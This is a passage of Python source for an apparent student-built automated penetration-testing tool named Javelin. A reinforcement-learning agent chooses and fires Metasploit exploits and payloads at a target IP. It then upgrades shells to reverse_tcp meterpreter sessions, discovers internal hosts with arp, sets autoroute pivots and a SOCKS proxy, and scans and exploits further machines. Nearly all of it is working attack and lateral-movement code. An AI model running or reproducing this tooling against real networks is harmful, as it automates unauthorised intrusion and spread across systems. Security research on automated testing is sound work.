            if module_name == '':
                
                payload_list = self.client.get_module_list('payload')

                
                fout = codecs.open(os.path.join(self.data_path, 'payload_list.csv'), 'w', 'utf-8')
                for idx, item in enumerate(payload_list):
                    time.sleep(0.1)
                    self.util.print_message(OK, '{}/{} Loaded payload: {}'.format(str(idx + 1),
                                                                                  len(payload_list),
                                                                                  item))
                    fout.write(item + '\n')
                fout.close()
                self.util.print_message(OK, 'Saved payload list.')
            elif target_num == '':
                
                payload_list = self.client.get_compatible_payload_list(module_name)
            else:
                
                payload_list = self.client.get_target_compatible_payload_list(module_name, target_num)
        else:
            
            local_file = os.path.join(self.data_path, 'payload_list.csv')
            self.util.print_message(OK, 'Loaded payload list from : {}'.format(local_file))
            payload_list = []
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                payload_list.append(item.rstrip('\n'))
            fin.close()
        return payload_list

    
    def reset_state(self, exploit_tree, target_tree):
        
        port_num = str(com_port_list[random.randint(0, len(com_port_list) - 1)])
        service_name = target_tree[port_num]['prod_name']
        if service_name == 'unknown':
            return True, None, None, None, None

        
        self.state = []

        
        self.os_real = target_tree['os_type']
        self.state.insert(ST_OS_TYPE, target_tree['os_type'])
        self.normalization(ST_OS_TYPE)

        
        for (idx, service) in enumerate(self.service_list):
            if service == service_name:
                self.state.insert(ST_SERV_NAME, idx)
                break
        self.normalization(ST_SERV_NAME)

        
        self.state.insert(ST_SERV_VER, target_tree[port_num]['version'])

        
        module_list = target_tree[port_num]['exploit']

        
        module_name = ''
        module_info = []
        while True:
            module_name = module_list[random.randint(0, len(module_list) - 1)]
            for (idx, exploit) in enumerate(com_exploit_list):
                exploit = 'exploit/' + exploit
                if exploit == module_name:
                    self.state.insert(ST_MODULE, idx)
                    break
            self.normalization(ST_MODULE)
            break

        
        module_name = module_name[8:]
        target_list = exploit_tree[module_name]['target_list']
        targets_num = target_list[random.randint(0, len(target_list) - 1)]
        self.state.insert(ST_TARGET, int(targets_num))

        
        

        
        target_info = {'protocol': target_tree[port_num]['protocol'],
                       'target_path': target_tree[port_num]['target_path'], 'prod_name': service_name,
                       'version': target_tree[port_num]['version'], 'exploit': module_name}
        if com_indicate_flag:
            port_num = target_tree['origin_port']
        target_info['port'] = str(port_num)

        return False, self.state, exploit_tree[module_name]['targets'][targets_num], target_list, target_info

    
    def get_state(self, exploit_tree, target_tree, port_num, exploit, target):
        
        service_name = target_tree[port_num]['prod_name']
        if service_name == 'unknown':
            return True, None, None, None

        
        self.state = []

        
        self.os_real = target_tree['os_type']
        self.state.insert(ST_OS_TYPE, target_tree['os_type'])
        self.normalization(ST_OS_TYPE)

        
        for (idx, service) in enumerate(self.service_list):
            if service == service_name:
                self.state.insert(ST_SERV_NAME, idx)
                break
        self.normalization(ST_SERV_NAME)

        
        self.state.insert(ST_SERV_VER, target_tree[port_num]['version'])

        
        for (idx, temp_exploit) in enumerate(com_exploit_list):
            temp_exploit = 'exploit/' + temp_exploit
            if exploit == temp_exploit:
                self.state.insert(ST_MODULE, idx)
                break
        self.normalization(ST_MODULE)

        
        self.state.insert(ST_TARGET, int(target))

        
        

        
        target_info = {'protocol': target_tree[port_num]['protocol'],
                       'target_path': target_tree[port_num]['target_path'],
                       'prod_name': service_name, 'version': target_tree[port_num]['version'],
                       'exploit': exploit[8:], 'target': target}
        if com_indicate_flag:
            port_num = target_tree['origin_port']
        target_info['port'] = str(port_num)

        return False, self.state, exploit_tree[exploit[8:]]['targets'][target], target_info

    
    def get_available_actions(self, payload_list):
        payload_num_list = []
        for self_payload in payload_list:
            for (idx, payload) in enumerate(com_payload_list):
                if payload == self_payload:
                    payload_num_list.append(idx)
                    break
        return payload_num_list

    
    def show_banner_bingo(self, prod_name, exploit, payload, sess_type, delay_time=2.0):
        banner = u"""
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                ██████   ██████  ███    ██ ███████ 
                ██   ██ ██    ██ ████   ██ ██      
                ██   ██ ██    ██ ██ ██  ██ █████   
                ██   ██ ██    ██ ██  ██ ██ ██      
                ██████   ██████  ██   ████ ███████      
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        """ + prod_name + ' ' + exploit + ' ' + payload + ' ' + sess_type + '\n'
        self.util.print_message(NONE, banner)
        time.sleep(delay_time)

    
    def set_options(self, target_info, target, selected_payload, exploit_tree):
        options = exploit_tree[target_info['exploit']]['options']
        key_list = options.keys()
        option = {}
        for key in key_list:
            if options[key]['required'] is True:
                sub_key_list = options[key].keys()
                if 'default' in sub_key_list:
                    
                    if options[key]['user_specify'] == '':
                        option[key] = options[key]['default']
                    else:
                        option[key] = options[key]['user_specify']
                else:
                    option[key] = '0'

            
            if len([s for s in self.path_collection if s in key.lower()]) != 0:
                option[key] = target_info['target_path']

        option['RHOST'] = self.rhost
        if self.port_div_symbol in target_info['port']:
            tmp_port = target_info['port'].split(self.port_div_symbol)
            option['RPORT'] = int(tmp_port[0])
        else:
            option['RPORT'] = int(target_info['port'])
        option['TARGET'] = int(target)
        if selected_payload != '':
            option['PAYLOAD'] = selected_payload
        return option

    
    def execute_exploit(self, action, thread_name, thread_type, target_list, target_info, step, exploit_tree, frame=0):
        
        target = ''
        if thread_type == 'learning':
            target = str(self.state[ST_TARGET])
        else:
            
            target = target_list
            
            if step > self.max_attempt - 1:
                return self.state, None, True, {}

        
        selected_payload = ''
        if action != 'no payload':
            selected_payload = com_payload_list[action]
        else:
            
            selected_payload = ''

        
        option = self.set_options(target_info, target, selected_payload, exploit_tree)

        
        reward = 0
        message = ''
        session_list = {}
        done = False
        job_id, uuid = self.client.execute_module('exploit', target_info['exploit'], option)
        if uuid is not None:
            
            _ = self.check_running_module(job_id, uuid)
            sessions = self.client.get_session_list()
            key_list = sessions.keys()
            if len(key_list) != 0:
                
                for key in key_list:
                    exploit_uuid = sessions[key][b'exploit_uuid'].decode('utf-8')
                    if uuid == exploit_uuid:
                        
                        session_id = int(key)
                        session_type = sessions[key][b'type'].decode('utf-8')
                        session_port = str(sessions[key][b'session_port'])
                        session_exploit = sessions[key][b'via_exploit'].decode('utf-8')
                        session_payload = sessions[key][b'via_payload'].decode('utf-8')
                        module_info = self.client.get_module_info('exploit', session_exploit)

                        
                        
                        
                        status = True

                        if status:
                            
                            reward = R_GREAT
                            done = True
                            message = 'bingo!! '

                            
                            self.show_banner_bingo(target_info['prod_name'],
                                                   session_exploit,
                                                   session_payload,
                                                   session_type)
                        else:
                            
                            reward = R_GOOD
                            message = 'misfire '

                        
                        vuln_name = module_info[b'name'].decode('utf-8')
                        description = module_info[b'description'].decode('utf-8')
                        ref_list = module_info[b'references']
                        reference = ''
                        for item in ref_list:
                            reference += '[' + item[0].decode('utf-8') + ']' + '@' + item[1].decode('utf-8') + '@@'

                        
                        if thread_type == 'learning':
                            with codecs.open(os.path.join(self.report_train_path,
                                                          thread_name + '.csv'), 'a', 'utf-8') as fout:
                                bingo = [self.util.get_current_date(),
                                         self.rhost,
                                         session_port,
                                         target_info['protocol'],
                                         target_info['prod_name'],
                                         str(target_info['version']),
                                         vuln_name,
                                         description,
                                         session_type,
                                         session_exploit,
                                         target,
                                         session_payload,
                                         reference]
                                writer = csv.writer(fout)
                                writer.writerow(bingo)
                        else:
                            with codecs.open(os.path.join(self.report_test_path,
                                                          thread_name + '.csv'), 'a', 'utf-8') as fout:
                                bingo = [self.util.get_current_date(),
                                         self.rhost,
                                         session_port,
                                         self.source_host,
                                         target_info['protocol'],
                                         target_info['prod_name'],
                                         str(target_info['version']),
                                         vuln_name,
                                         description,
                                         session_type,
                                         session_exploit,
                                         target,
                                         session_payload,
                                         reference]
                                writer = csv.writer(fout)
                                writer.writerow(bingo)

                        
                        
                        

                        
                        if thread_type == 'learning':
                            self.client.stop_session(session_id)
                            
                            self.client.stop_meterpreter_session(session_id)
                            
                        
                        else:
                            
                            
                            session_list['id'] = session_id
                            session_list['type'] = session_type
                            session_list['port'] = session_port
                            session_list['exploit'] = session_exploit
                            session_list['target'] = target
                            session_list['payload'] = session_payload
                        break
                else:
                    
                    reward = R_BAD
                    message = 'failure '
            else:
                
                reward = R_BAD
                message = 'failure '
        else:
            
            done = True
            reward = R_BAD
            message = 'time out'

        
        if thread_type == 'learning':
            self.util.print_message(OK, '{0:04d}/{1:04d} : {2:03d}/{3:03d} {4} reward:{5} {6} {7} ({8}/{9}) '
                                        '{10} | {11} | {12} | {13}'.format(frame,
                                                                           MAX_TRAIN_NUM,
                                                                           step,
                                                                           MAX_STEPS,
                                                                           thread_name,
                                                                           str(reward),
                                                                           message,
                                                                           self.rhost,
                                                                           target_info['protocol'],
                                                                           target_info['port'],
                                                                           target_info['prod_name'],
                                                                           target_info['exploit'],
                                                                           selected_payload,
                                                                           target))
        else:
            self.util.print_message(OK, '{0}/{1} {2} {3} ({4}/{5}) '
                                        '{6} | {7} | {8} | {9}'.format(step+1,
                                                                       self.max_attempt,
                                                                       message,
                                                                       self.rhost,
                                                                       target_info['protocol'],
                                                                       target_info['port'],
                                                                       target_info['prod_name'],
                                                                       target_info['exploit'],
                                                                       selected_payload,
                                                                       target))

        
        targets_num = 0
        if thread_type == 'learning' and len(target_list) != 0:
            targets_num = random.randint(0, len(target_list) - 1)
        self.state[ST_TARGET] = targets_num
        '''
        if thread_type == 'learning' and len(target_list) != 0:
            if reward == R_BAD and self.state[ST_STAGE] == S_NORMAL:
                
                self.state[ST_TARGET] = random.randint(0, len(target_list) - 1)
            elif reward == R_GOOD:
                
                self.state[ST_STAGE] = S_EXPLOIT
            else:
                
                self.state[ST_STAGE] = S_PEXPLOIT
        '''

        return self.state, reward, done, session_list

    
    def check_post_exploit(self, session_id, session_type):
        new_session_id = 0
        status = False
        job_id = None
        if session_type == 'shell' or session_type == 'powershell':
            
            upgrade_result, job_id, lport = self.upgrade_shell(session_id)
            if upgrade_result == 'success':
                sessions = self.client.get_session_list()
                session_list = list(sessions.keys())
                for sess_idx in session_list:
                    if session_id < sess_idx and sessions[sess_idx][b'type'].lower() == b'meterpreter':
                        status = True
                        new_session_id = sess_idx
                        break
            else:
                status = False
        elif session_type == 'meterpreter':
            status = True
        else:
            status = False
        return status, job_id, new_session_id

    
    def check_payload_type(self, session_payload, session_type):
        status = None
        if session_type == 'shell' or session_type == 'powershell':
            
            if session_payload.count('/') > 1:
                
                status = True
            else:
                
                status = False
        elif session_type == 'meterpreter':
            status = True
        else:
            status = False
        return status

    
    def execute_post_exploit(self, session_id, session_type):
        internal_ip_list = []
        if session_type == 'shell' or session_type == 'powershell':
            
            upgrade_result, _, _ = self.upgrade_shell(session_id)
            if upgrade_result == 'success':
                sessions = self.client.get_session_list()
                session_list = list(sessions.keys())
                for sess_idx in session_list:
                    if session_id < sess_idx and sessions[sess_idx][b'type'].lower() == b'meterpreter':
                        self.util.print_message(NOTE, 'Successful: Upgrade.')
                        session_id = sess_idx

                        
                        internal_ip_list, _ = self.get_internal_ip(session_id)
                        if len(internal_ip_list) == 0:
                            self.util.print_message(WARNING, 'Internal server is not found.')
                        else:
                            
                            self.util.print_message(OK, 'Internal server list.\n{}'.format(internal_ip_list))
                            self.set_pivoting(session_id, internal_ip_list)
                        break
            else:
                self.util.print_message(WARNING, 'Failure: Upgrade session from shell to meterpreter.')
        elif session_type == 'meterpreter':
            
            internal_ip_list, _ = self.get_internal_ip(session_id)
            if len(internal_ip_list) == 0:
                self.util.print_message(WARNING, 'Internal server is not found.')
            else:
                
                self.util.print_message(OK, 'Internal server list.\n{}'.format(internal_ip_list))
                self.set_pivoting(session_id, internal_ip_list)
        else:
            self.util.print_message(WARNING, 'Unknown session type: {}.'.format(session_type))
        return internal_ip_list

    
    def upgrade_shell(self, session_id):
        
        self.util.print_message(NOTE, 'Upgrade session from shell to meterpreter.')
        payload = ''
        
        if self.os_real == 0:
            payload = 'windows/meterpreter/reverse_tcp'
        elif self.os_real == 3:
            payload = 'osx/x64/meterpreter_reverse_tcp'
        else:
            payload = 'linux/x86/meterpreter_reverse_tcp'

        
        module = 'exploit/multi/handler'
        lport = random.randint(10001, 65535)
        option = {'LHOST': self.lhost, 'LPORT': lport, 'PAYLOAD': payload, 'TARGET': 0}
        job_id, uuid = self.client.execute_module('exploit', module, option)
        time.sleep(0.5)
        if uuid is None:
            self.util.print_message(FAIL, 'Failure executing module: {}'.format(module))
            return 'failure', job_id, lport

        
        status = self.client.upgrade_shell_session(session_id, self.lhost, lport)
        return status, job_id, lport

    
    def check_running_module(self, job_id, uuid):
        
        time_count = 0
        while True:
            job_id_list = self.client.get_job_list()
            if job_id in job_id_list:
                time.sleep(1)
            else:
                return True
            if self.timeout == time_count:
                self.client.stop_job(str(job_id))
                self.util.print_message(WARNING, 'Timeout: job_id={}, uuid={}'.format(job_id, uuid))
                return False
            time_count += 1

    
    def get_internal_ip(self, session_id):
        
        self.util.print_message(OK, 'Searching internal servers...')
        cmd = 'arp\n'
        _ = self.client.execute_meterpreter(session_id, cmd)
        time.sleep(3.0)
        data = self.client.get_meterpreter_result(session_id)
        if (data is None) or ('unknown command' in data.lower()):
            self.util.print_message(FAIL, 'Failed: Get meterpreter result')
            return [], False
        self.util.print_message(OK, 'Result of arp: \n{}'.format(data))
        regex_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*[a-z0-9]{2}:[a-z0-9]{2}:[a-z0-9]{2}:[a-z0-9]{2}'
        temp_list = self.cutting_strings(regex_pattern, data)
        internal_ip_list = []
        for ip_addr in temp_list:
            if ip_addr != self.lhost:
                internal_ip_list.append(ip_addr)
        return list(set(internal_ip_list)), True

    
    def get_subnet(self, session_id, internal_ip):
        cmd = 'run get_local_subnets\n'
        _ = self.client.execute_meterpreter(session_id, cmd)
        time.sleep(3.0)
        data = self.client.get_meterpreter_result(session_id)
        if data is not None:
            self.util.print_message(OK, 'Result of get_local_subnets: \n{}'.format(data))
            regex_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
            temp_subnet = self.cutting_strings(regex_pattern, data)
            try:
                subnets = temp_subnet[0].split('/')
                return [subnets[0], subnets[1]]
            except Exception as e:
                self.util.print_exception(e, 'Failed: {}'.format(cmd))
                return ['.'.join(internal_ip.split('.')[:3]) + '.0', '255.255.255.0']
        else:
            self.util.print_message(WARNING, '"{}" is failure.'.format(cmd))
            return ['.'.join(internal_ip.split('.')[:3]) + '.0', '255.255.255.0']

    
    def set_pivoting(self, session_id, ip_list):
        
        temp_subnet = []
        for internal_ip in ip_list:
            
            temp_subnet.append(self.get_subnet(session_id, internal_ip))

        
        for subnet in list(map(list, set(map(tuple, temp_subnet)))):
            cmd = 'run autoroute -s ' + subnet[0] + ' ' + subnet[1] + '\n'
            _ = self.client.execute_meterpreter(session_id, cmd)
            time.sleep(3.0)
            _ = self.client.execute_meterpreter(session_id, 'run autoroute -p\n')


MIN_BATCH = 5
LOSS_V = .5  
LOSS_ENTROPY = .01  
LEARNING_RATE = 5e-3
RMSPropDecaly = 0.99

GAMMA = 0.99
N_STEP_RETURN = 5
GAMMA_N = GAMMA ** N_STEP_RETURN

TRAIN_WORKERS = 10  
TEST_WORKER = 1  
MAX_STEPS = 20  
MAX_TRAIN_NUM = 5000  
Tmax = 5  

EPS_START = 0.5
EPS_END = 0.0


class ParameterServer:
    def __init__(self):
        
        with tf.variable_scope("parameter_server"):
            
            self.model = self._build_model()

        
        self.weights_params = tf.get_collection(tf.GraphKeys.TRAINABLE_VARIABLES, scope="parameter_server")
        
        self.optimizer = tf.train.RMSPropOptimizer(LEARNING_RATE, RMSPropDecaly)

    
    def _build_model(self):
        l_input = Input(batch_shape=(None, NUM_STATES))
        l_dense1 = Dense(50, activation='relu')(l_input)
        l_dense2 = Dense(100, activation='relu')(l_dense1)
        l_dense3 = Dense(200, activation='relu')(l_dense2)
        l_dense4 = Dense(400, activation='relu')(l_dense3)
        out_actions = Dense(NUM_ACTIONS, activation='softmax')(l_dense4)
        out_value = Dense(1, activation='linear')(l_dense4)
        model = Model(inputs=[l_input], outputs=[out_actions, out_value])
        return model


class LocalBrain:
    def __init__(self, name, parameter_server):
        self.util = Utilty()
        with tf.name_scope(name):
            
            self.train_queue = [[], [], [], [], []]
            K.set_session(SESS)

            
            self.model = self._build_model()
            
            self._build_graph(name, parameter_server)

    
    def _build_model(self):
        l_input = Input(batch_shape=(None, NUM_STATES))
        l_dense1 = Dense(50, activation='relu')(l_input)
        l_dense2 = Dense(100, activation='relu')(l_dense1)
        l_dense3 = Dense(200, activation='relu')(l_dense2)
        l_dense4 = Dense(400, activation='relu')(l_dense3)
        out_actions = Dense(NUM_ACTIONS, activation='softmax')(l_dense4)
        out_value = Dense(1, activation='linear')(l_dense4)
        model = Model(inputs=[l_input], outputs=[out_actions, out_value])
        
        model._make_predict_function()
        return model

    
    def _build_graph(self, name, parameter_server):
        self.s_t = tf.placeholder(tf.float32, shape=(None, NUM_STATES))
        self.a_t = tf.placeholder(tf.float32, shape=(None, NUM_ACTIONS))
        
        self.r_t = tf.placeholder(tf.float32, shape=(None, 1))

        p, v = self.model(self.s_t)

        
        log_prob = tf.log(tf.reduce_sum(p * self.a_t, axis=1, keepdims=True) + 1e-10)
        advantage = self.r_t - v
        loss_policy = - log_prob * tf.stop_gradient(advantage)
        
        loss_value = LOSS_V * tf.square(advantage)
        
        entropy = LOSS_ENTROPY * tf.reduce_sum(p * tf.log(p + 1e-10), axis=1, keepdims=True)
        self.loss_total = tf.reduce_mean(loss_policy + loss_value + entropy)

        
        self.weights_params = tf.get_collection(tf.GraphKeys.TRAINABLE_VARIABLES, scope=name)
        
        self.grads = tf.gradients(self.loss_total, self.weights_params)

        
        self.update_global_weight_params = \
            parameter_server.optimizer.apply_gradients(zip(self.grads, parameter_server.weights_params))

        
        self.pull_global_weight_params = [l_p.assign(g_p)
                                          for l_p, g_p in zip(self.weights_params, parameter_server.weights_params)]

        
        self.push_local_weight_params = [g_p.assign(l_p)
                                         for g_p, l_p in zip(parameter_server.weights_params, self.weights_params)]

    
    def pull_parameter_server(self):
        SESS.run(self.pull_global_weight_params)

    
    def push_parameter_server(self):
        SESS.run(self.push_local_weight_params)

    
    def update_parameter_server(self):
        if len(self.train_queue[0]) < MIN_BATCH:
            return

        self.util.print_message(NOTE, 'Update LocalBrain weight to ParameterServer.')
        s, a, r, s_, s_mask = self.train_queue
        self.train_queue = [[], [], [], [], []]
        s = np.vstack(s)
        a = np.vstack(a)
        r = np.vstack(r)
        s_ = np.vstack(s_)
        s_mask = np.vstack(s_mask)
        _, v = self.model.predict(s_)

        
        r = r + GAMMA_N * v * s_mask
        feed_dict = {self.s_t: s, self.a_t: a, self.r_t: r}  
        SESS.run(self.update_global_weight_params, feed_dict)  

    
    def predict_p(self, s):
        p, v = self.model.predict(s)
        return p

    def train_push(self, s, a, r, s_):
        self.train_queue[0].append(s)
        self.train_queue[1].append(a)
        self.train_queue[2].append(r)

        if s_ is None:
            self.train_queue[3].append(NONE_STATE)
            self.train_queue[4].append(0.)
        else:
            self.train_queue[3].append(s_)
            self.train_queue[4].append(1.)


class Agent:
    def __init__(self, name, parameter_server):
        self.brain = LocalBrain(name, parameter_server)
        self.memory = []  
        self.R = 0.  

    def act(self, s, available_action_list, eps_steps):
        
        if frames >= eps_steps:
            eps = EPS_END
        else:
            
            eps = EPS_START + frames * (EPS_END - EPS_START) / eps_steps

        if random.random() < eps:
            
            if len(available_action_list) != 0:
                return available_action_list[random.randint(0, len(available_action_list) - 1)], None, None
            else:
                return 'no payload', None, None
        else:
            
            s = np.array([s])
            p = self.brain.predict_p(s)
            if len(available_action_list) != 0:
                prob = []
                for action in available_action_list:
                    prob.append([action, p[0][action]])
                prob.sort(key=lambda s: -s[1])
                return prob[0][0], prob[0][1], prob
            else:
                return 'no payload', p[0][len(p[0]) - 1], None

    
    def advantage_push_local_brain(self, s, a, r, s_):
        def get_sample(memory, n):
            s, a, _, _ = memory[0]
            _, _, _, s_ = memory[n - 1]
            return s, a, self.R, s_

        
        a_cats = np.zeros(NUM_ACTIONS)
        a_cats[a] = 1
        self.memory.append((s, a_cats, r, s_))

        
        self.R = (self.R + r * GAMMA_N) / GAMMA

        
        if s_ is None:
            while len(self.memory) > 0:
                n = len(self.memory)
                s, a, r, s_ = get_sample(self.memory, n)
                self.brain.train_push(s, a, r, s_)
                self.R = (self.R - self.memory[0][2]) / GAMMA
                self.memory.pop(0)

            self.R = 0

        if len(self.memory) >= N_STEP_RETURN:
            s, a, r, s_ = get_sample(self.memory, N_STEP_RETURN)
            self.brain.train_push(s, a, r, s_)
            self.R = self.R - self.memory[0][2]
            self.memory.pop(0)


class Environment:
    total_reward_vec = np.zeros(10)
    count_trial_each_thread = 0

    def __init__(self, name, thread_type, parameter_server, rhost):
        self.name = name
        self.thread_type = thread_type
        self.env = Metasploit(rhost)
        self.agent = Agent(name, parameter_server)
        self.util = Utilty()

    def run(self, exploit_tree, target_tree):
        self.agent.brain.pull_parameter_server()  
        global frames              
        global isFinish            
        global exploit_count       
        global post_exploit_count  
        global plot_count          
        global plot_pcount         

        if self.thread_type == 'test':
            
            self.util.print_message(NOTE, 'Execute exploitation.')
            session_list = []
            for port_num in com_port_list:
                execute_list = []
                target_info = {}
                module_list = target_tree[port_num]['exploit']
                for exploit in module_list:
                    target_list = exploit_tree[exploit[8:]]['target_list']
                    for target in target_list:
                        skip_flag, s, payload_list, target_info = self.env.get_state(exploit_tree,
                                                                                     target_tree,
                                                                                     port_num,
                                                                                     exploit,
                                                                                     target)
                        if skip_flag is False:
                            
                            available_actions = self.env.get_available_actions(payload_list)

                            
                            frames = self.env.eps_steps
                            _, _, p_list = self.agent.act(s, available_actions, self.env.eps_steps)
                            
                            if p_list is not None:
                                for prob in p_list:
                                    execute_list.append([prob[1], exploit, target, prob[0], target_info])
                        else:
                            continue

                
                execute_list.sort(key=lambda s: -s[0])
                for idx, exe_info in enumerate(execute_list):
                    
                    _, _, done, sess_info = self.env.execute_exploit(exe_info[3],
                                                                     self.name,
                                                                     self.thread_type,
                                                                     exe_info[2],
                                                                     exe_info[4],
                                                                     idx,
                                                                     exploit_tree)

                    
                    if len(sess_info) != 0:
                        session_list.append(sess_info)

                    
                    if done is True:
                        break

            
            new_target_list = []
            for session in session_list:
                self.util.print_message(NOTE, 'Execute post exploitation.')
                self.util.print_message(OK, 'Target session info.\n'
                                            '    session id   : {0}\n'
                                            '    session type : {1}\n'
                                            '    target port  : {2}\n'
                                            '    exploit      : {3}\n'
                                            '    target       : {4}\n'
                                            '    payload      : {5}'.format(session['id'],
                                                                            session['type'],
                                                                            session['port'],
                                                                            session['exploit'],
                                                                            session['target'],
                                                                            session['payload']))
                internal_ip_list = self.env.execute_post_exploit(session['id'], session['type'])
                for ip_addr in internal_ip_list:
                    if ip_addr not in self.env.prohibited_list and ip_addr != self.env.rhost:
                        new_target_list.append(ip_addr)
                    else:
                        self.util.print_message(WARNING, 'Target IP={} is prohibited.'.format(ip_addr))

            
            new_target_list = list(set(new_target_list))
            if len(new_target_list) != 0:
                
                module = 'auxiliary/server/socks4a'
                self.util.print_message(NOTE, 'Set proxychains: SRVHOST={}, SRVPORT={}'.format(self.env.proxy_host,
                                                                                               str(self.env.proxy_port)))
                option = {'SRVHOST': self.env.proxy_host, 'SRVPORT': self.env.proxy_port}
                job_id, uuid = self.env.client.execute_module('auxiliary', module, option)
                if uuid is None:
                    self.util.print_message(FAIL, 'Failure executing module: {}'.format(module))
                    isFinish = True
                    return

                
                self.env.source_host = self.env.rhost
                self.env.prohibited_list.append(self.env.rhost)
                self.env.isPostExploit = True
                self.deep_run(new_target_list)

            isFinish = True
        else:
            
            skip_flag, s, payload_list, target_list, target_info = self.env.reset_state(exploit_tree, target_tree)

            
            if skip_flag is False:
                R = 0
                step = 0
                while True:
                    
                    available_actions = self.env.get_available_actions(payload_list)
                    a, _, _ = self.agent.act(s, available_actions, self.env.eps_steps)
                    
                    s_, r, done, _ = self.env.execute_exploit(a,
                                                              self.name,
                                                              self.thread_type,
                                                              target_list,
                                                              target_info,
                                                              step,
                                                              exploit_tree,
                                                              frames)
                    step += 1

                    
                    payload_list = exploit_tree[target_info['exploit']]['targets'][str(self.env.state[ST_TARGET])]

                    
                    
                    if step > MAX_STEPS:
                        done = True

                    
                    frames += 1

                    
                    if r == R_GOOD:
                        exploit_count += 1

                    
                    if r == R_GREAT:
                        exploit_count += 1
                        post_exploit_count += 1

                    
                    if frames % 100 == 0:
                        self.util.print_message(NOTE, 'Plot number of successful post-exploitation.')
                        plot_count.append(exploit_count)
                        plot_pcount.append(post_exploit_count)
                        exploit_count = 0
                        post_exploit_count = 0

                    
                    if a == 'no payload':
                        a = len(com_payload_list) - 1
                    self.agent.advantage_push_local_brain(s, a, r, s_)

                    s = s_
                    R += r
                    
                    if done or (step % Tmax == 0):
                        if not (isFinish):
                            self.agent.brain.update_parameter_server()
                            self.agent.brain.pull_parameter_server()

                    if done:
                        
                        self.total_reward_vec = np.hstack((self.total_reward_vec[1:], step))
                        
                        self.count_trial_each_thread += 1
                        break

                
                self.util.print_message(OK, 'Thread: {}, Trial num: {}, '
                                            'Step: {}, Avg step: {}'.format(self.name,
                                                                            str(self.count_trial_each_thread),
                                                                            str(step),
                                                                            str(self.total_reward_vec.mean())))

                
                if frames > MAX_TRAIN_NUM:
                    self.util.print_message(OK, 'Finish train:{}'.format(self.name))
                    isFinish = True
                    self.util.print_message(OK, 'Stopping learning...')
                    time.sleep(30.0)
                    
                    self.agent.brain.push_parameter_server()

    
    def deep_run(self, target_ip_list):
        for target_ip in target_ip_list:
            result_file = 'nmap_result_' + target_ip + '.xml'
            command = self.env.nmap_2nd_command + ' ' + result_file + ' ' + target_ip + '\n'
            self.env.execute_nmap(target_ip, command, self.env.nmap_2nd_timeout)
            com_port_list, proto_list, info_list = self.env.get_port_list(result_file, target_ip)

            
            exploit_tree = self.env.get_exploit_tree()
            target_tree = self.env.get_target_info(target_ip, proto_list, info_list)

            
            self.env.rhost = target_ip
            self.run(exploit_tree, target_tree)


class Worker_thread:
    def __init__(self, thread_name, thread_type, parameter_server, rhost):
        self.environment = Environment(thread_name, thread_type, parameter_server, rhost)
        self.thread_name = thread_name
        self.thread_type = thread_type
        self.util = Utilty()

    
    def run(self, exploit_tree, target_tree, saver=None, train_path=None):
        self.util.print_message(NOTE, 'Executing start: {}'.format(self.thread_name))
        while True:
            if self.thread_type == 'learning':
                
                self.environment.run(exploit_tree, target_tree)

                
                if isFinish:
                    self.util.print_message(OK, 'Finish train: {}'.format(self.thread_name))
                    time.sleep(3.0)

                    
                    self.util.print_message(OK, 'Save learned data: {}'.format(self.thread_name))
                    saver.save(SESS, train_path)

                    
                    self.environment.env.client.termination(self.environment.env.client.console_id)

                    if self.thread_name == 'local_thread1':
                        
                        df_plot = pd.DataFrame({'exploitation': plot_count,
                                                'post-exploitation': plot_pcount})
                        df_plot.to_csv(os.path.join(self.environment.env.data_path, 'experiment.csv'))
                        
                        
                        

                        
                        report = CreateReport()
                        report.create_report('train', pd.to_datetime(self.environment.env.scan_start_time))
                    break
            else:
                
                self.environment.run(exploit_tree, target_tree)

                
                if isFinish:
                    self.util.print_message(OK, 'Finish test.')
                    time.sleep(3.0)

                    
                    self.environment.env.client.termination(self.environment.env.client.console_id)

                    
                    report = CreateReport()
                    report.create_report('test', pd.to_datetime(self.environment.env.scan_start_time))
                    break


def show_banner(util, delay_time=2.0):
    banner = u"""
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 ▄▄▄██▀▀▀▄▄▄    ██▒   █▓▓█████  ██▓     ██▓ ███▄    █ 
   ▒██  ▒████▄ ▓██░   █▒▓█   ▀ ▓██▒    ▓██▒ ██ ▀█   █ 
   ░██  ▒██  ▀█▄▓██  █▒░▒███   ▒██░    ▒██▒▓██  ▀█ ██▒
▓██▄██▓ ░██▄▄▄▄██▒██ █░░▒▓█  ▄ ▒██░    ░██░▓██▒  ▐▌██▒
 ▓███▒   ▓█   ▓██▒▒▀█░  ░▒████▒░██████▒░██░▒██░   ▓██░
 ▒▓▒▒░   ▒▒   ▓▒█░░ ▐░  ░░ ▒░ ░░ ▒░▓  ░░▓  ░ ▒░   ▒ ▒ 
 ▒ ░▒░    ▒   ▒▒ ░░ ░░   ░ ░  ░░ ░ ▒  ░ ▒ ░░ ░░   ░ ▒░
 ░ ░ ░    ░   ▒     ░░     ░     ░ ░    ▒ ░   ░   ░ ░ 
 ░   ░        ░  ░   ░     ░  ░    ░  ░ ░           ░ 
                    ░                                 
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    """
    util.print_message(NONE, banner)
    show_credit(util)
    time.sleep(delay_time)


def show_credit(util):
    credit = u"""
       =[ Javelin                                      ]=
+ -- --=[ R.M.R.M.L.Rathnayaka                         ]=--
+ -- --=[ 10747919@students.plymouth.ac.uk             ]=--
    """
    util.print_message(NONE, credit)


def is_valid_ip(rhost):
    try:
        ipaddress.ip_address(rhost)
        return True
    except ValueError:
        return False


__doc__ = """{f}
Usage:
    {f} (-t <ip_addr> | --target <ip_addr>) (-m <mode> | --mode <mode>)
    {f} (-t <ip_addr> | --target <ip_addr>) [(-p <port> | --port <port>)] [(-s <product> | --service <product>)]
    {f} -h | --help

Options:
    -t --target   Require  : IP address of target server.
    -m --mode     Require  : Execution mode "train/test".
    -p --port     Optional : Indicate port number of target server.
    -s --service  Optional : Indicate product name of target server.
    -h --help     Optional : Show this screen and exit.
""".format(f=__file__)


def command_parse():
    args = docopt(__doc__)
